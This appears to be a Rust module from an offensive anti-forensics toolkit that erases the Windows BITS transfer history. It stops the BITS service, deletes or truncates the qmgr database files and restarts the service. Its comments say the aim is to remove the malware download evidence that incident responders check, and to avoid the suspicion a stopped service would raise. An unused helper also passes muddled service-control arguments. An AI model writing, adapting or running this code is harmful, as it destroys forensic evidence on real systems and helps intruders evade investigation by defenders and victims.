// Wipe BITS (Background Intelligent Transfer Service) forensic artifacts.
//
// BITS records every file transfer (URL, destination path, timestamps), including
// malware download evidence. IR teams check this as a standard IOC source.
//
// Artifacts:
//   C:\ProgramData\Microsoft\Network\Downloader\qmgr.db     (Win10+ ESE database)
//   C:\ProgramData\Microsoft\Network\Downloader\qmgr0.dat   (legacy Win7/8 format)
//   C:\ProgramData\Microsoft\Network\Downloader\qmgr1.dat   (legacy)
//
// Strategy: stop the BITS service, delete/truncate all database files, restart service.
// Stopping is necessary because the database is locked during service operation.

#![cfg(target_os = "windows")]

use std::fs;
use std::path::Path;
use std::process::Command;
use std::thread;
use std::time::Duration;

#[derive(Default)]
pub struct BitsWipeStats {
    pub files_removed: u32,
    pub errors:        u32,
    pub service_stopped: bool,
}

const BITS_DIR: &str = r"C:\ProgramData\Microsoft\Network\Downloader";
const BITS_FILES: &[&str] = &["qmgr.db", "qmgr0.dat", "qmgr1.dat"];

fn sc_control(action: &str) -> bool {
    // Use sc.exe to control service (avoids Windows API complexity)
    Command::new("sc.exe")
        .args(["stop", "BITS"])
        .arg(if action == "stop" { "BITS" } else { "BITS" })
        .output()
        .is_ok()
}

fn stop_bits_service(verbose: bool) -> bool {
    let ok = Command::new("sc.exe")
        .args(["stop", "BITS"])
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false);

    if ok {
        // Wait for service to stop (up to 5 seconds)
        thread::sleep(Duration::from_millis(2000));
        if verbose { eprintln!("[+] wipe-bits: BITS service stopped"); }
    } else {
        if verbose { eprintln!("[!] wipe-bits: failed to stop BITS (may already be stopped)"); }
    }
    ok
}

fn start_bits_service(verbose: bool) {
    let ok = Command::new("sc.exe")
        .args(["start", "BITS"])
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false);

    if verbose {
        if ok { eprintln!("[+] wipe-bits: BITS service restarted"); }
        else  { eprintln!("[!] wipe-bits: failed to restart BITS"); }
    }
}

pub fn wipe_bits(restart_service: bool, verbose: bool) -> BitsWipeStats {
    let mut s = BitsWipeStats::default();

    let dir = Path::new(BITS_DIR);
    if !dir.exists() {
        if verbose { eprintln!("[*] wipe-bits: downloader dir not found ({}) — skipping", BITS_DIR); }
        return s;
    }

    // Stop BITS service to release file locks
    s.service_stopped = stop_bits_service(verbose);

    // Remove all BITS database files
    for fname in BITS_FILES {
        let p = dir.join(fname);
        if !p.exists() { continue; }

        match fs::remove_file(&p) {
            Ok(_)  => {
                s.files_removed += 1;
                if verbose { eprintln!("[+] wipe-bits: removed {:?}", p); }
            }
            Err(e) => {
                // Service still holding lock — try truncation as fallback
                if let Ok(f) = fs::OpenOptions::new().write(true).open(&p) {
                    let _ = f.set_len(0);
                    s.files_removed += 1;
                    if verbose { eprintln!("[+] wipe-bits: truncated {:?}", p); }
                } else {
                    s.errors += 1;
                    if verbose { eprintln!("[!] wipe-bits: {:?}: {}", p, e); }
                }
            }
        }
    }

    // Optionally restart service (leaving it stopped looks suspicious)
    if restart_service && s.service_stopped {
        // Brief delay before restart
        thread::sleep(Duration::from_millis(500));
        start_bits_service(verbose);
    }

    if verbose {
        eprintln!("[+] wipe-bits: {} files removed, {} errors", s.files_removed, s.errors);
    }
    s
}
